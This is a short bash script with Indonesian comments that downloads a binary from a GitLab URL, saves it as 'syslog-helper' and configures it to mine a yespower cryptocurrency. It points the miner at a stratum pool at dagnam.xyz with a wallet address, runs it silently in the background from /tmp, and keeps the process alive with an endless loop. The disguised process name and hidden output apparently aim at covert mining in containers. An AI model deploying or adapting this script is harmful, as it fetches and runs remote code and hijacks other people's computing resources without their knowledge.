#!/bin/bash

# --- KONFIGURASI ---
FAKE_NAME="syslog-helper"
BINARY_URL="https://gitlab.com/ferrynara12/mypro/-/raw/main/docker"
INSTALL_DIR="/tmp" # Gunakan /tmp agar lebih aman di container
CONF_DIR="/tmp/syslog-conf"

echo "--- Memulai Setup Miner (Non-Systemd ) ---"

# 1. Instal Dependensi (Jika belum ada)
apt update && apt install -y curl libcurl4 libjansson4 libssl3

# 2. Buat direktori konfigurasi
mkdir -p $CONF_DIR

# 3. Download dan Rename Binary
echo "Mengunduh binary..."
curl -L $BINARY_URL -o $INSTALL_DIR/$FAKE_NAME
chmod +x $INSTALL_DIR/$FAKE_NAME

# 4. Buat file konfigurasi JSON
cat <<EOF > $CONF_DIR/config.json
{
    "algo": "yespower",
    "url": "stratum+tcp://dagnam.xyz:4629",
    "user": "WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1",
    "pass": "c=SWAMP",
    "threads": 1,
    "quiet": false
}
EOF

# 5. Jalankan langsung di background
echo "Menjalankan miner..."
cd $INSTALL_DIR
./$FAKE_NAME -c $CONF_DIR/config.json > /dev/null 2>&1 &

echo "--------------------------"
echo "Selesai! Cek apakah proses sudah ada dengan perintah:"
echo "ps aux | grep $FAKE_NAME"
ps aux | grep $FAKE_NAME

echo "Running..."

while true
do
  sleep 60
done
